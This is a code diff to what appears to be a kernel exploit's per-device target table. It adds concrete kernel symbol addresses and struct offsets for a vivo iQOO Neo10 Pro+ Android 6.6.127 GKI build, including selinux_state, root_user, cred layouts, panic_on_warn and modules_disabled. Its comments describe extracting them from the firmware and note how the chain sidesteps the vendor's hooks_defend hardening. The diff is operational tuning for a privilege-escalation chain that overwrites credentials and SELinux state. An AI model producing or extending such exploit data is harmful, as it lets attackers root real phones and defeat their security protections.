@@ -248,22 +248,39 @@ static const struct target g_targets[] = {
     {
         /*
          * 6.6.127-android15-8-g24b70dd1cb81-abogki543627741-4k
-         * Not on the public CI / kernel tree; the statics need the build's
-         * vmlinux (or boot.img). Layout constants carried over from the
-         * same 6.6.127-android15-8 base (CONFIG_RANDSTRUCT_NONE); verify
-         * against the BTF once the vmlinux is available.
+         * vivo iQOO Neo10 Pro+ (PD2463) OriginOS 7, 17.2.9.7.W10.V000L1.
+         * Constants derived from the build's kernel Image (kallsyms via
+         * vmlinux-to-elf, capstone disassembly, BTF); 10/10 statics match
+         * the independent profile in docs/20 of
+         * janewas/cve-2026-98260-vivo-gki-research:
+         *   - timer site: ldr x0,[posix_timers_cache] + bl
+         *     kmem_cache_alloc at do_timer_create+0xa4, call_site (ret)
+         *     0xffffffc080197fe4 -> 0x197fe4;
+         *   - copy_process: bl kmem_cache_alloc_node ret +0x140 -> 0xac790;
+         *   - BTF layouts match the g468e81627094 / g3b723d0e8507 entries
+         *     (task_struct 0x12c0 cred@0x820, cred 0xb8 uid@0x8, k_itimer
+         *     0x108 it_signal@0x60, signal_struct.posix_cputimers@0x120);
+         *   - __tracepoint_sys_exit 0xffffffc0822f3720;
+         *   - OriginOS 7: hooks_defend.ko is present (permanent module,
+         *     kptr_restrict re-pinned).  HKD stays disabled
+         *     (kptr_restrict_static = 0): untested on this build and
+         *     unnecessary -- the chain is kallsyms-free and loads no
+         *     modules.  The only per-build HKD input, the kptr_restrict
+         *     address, is verified at 0xffffffc08215baf8 (identical to
+         *     the g3b723d0e8507 entry); guard structures are resolved
+         *     and signature-checked at runtime by the hkd stages.
          */
         .prefix = "6.6.127-android15-8-g24b70dd1cb81",
-        .static_timer_site = 0ULL, /* TODO: vmlinux/boot.img */
-        .timer_site_low21 = 0ULL,  /* TODO: vmlinux/boot.img */
-        .selinux_state_static = 0ULL,  /* TODO */
-        .panic_on_warn_static = 0ULL,  /* TODO */
-        .copy_process_low21 = 0ULL,    /* TODO */
-        .root_user_static = 0ULL,      /* TODO */
-        .init_user_ns_static = 0ULL,   /* TODO */
-        .init_ucounts_static = 0ULL,   /* TODO */
-        .init_groups_static = 0ULL,    /* TODO */
-        .tp_sys_exit_static = 0ULL,    /* TODO */
+        .static_timer_site = 0xffffffc080197fe4ULL,
+        .timer_site_low21 = 0x197fe4ULL,
+        .selinux_state_static = 0xffffffc08239a170ULL,
+        .panic_on_warn_static = 0xffffffc08214ac0cULL,
+        .copy_process_low21 = 0xac790ULL,
+        .root_user_static = 0xffffffc08216f108ULL,
+        .init_user_ns_static = 0xffffffc08216ee78ULL,
+        .init_ucounts_static = 0xffffffc082170bd8ULL,
+        .init_groups_static = 0xffffffc082170668ULL,
+        .tp_sys_exit_static = 0xffffffc0822f3720ULL,
         .timer_alloc = 0x108ULL,
         .cred_req = 0xb8ULL,
         .cred_alloc = 0xc0ULL,
@@ -276,6 +293,9 @@ static const struct target g_targets[] = {
         .vr_tag_a_off = 0x06ULL,
         .vr_tag_b_off = 0x2cULL,
         .tracepoint_funcs_off = 0x48ULL,
+        .modules_disabled_static = 0xffffffc08237b800ULL,
+        .kprobes_disarm_static = 0xffffffc08237ee80ULL,
+        .kptr_restrict_static = 0ULL, /* hooks_defend present; see above */
     },
 };
 
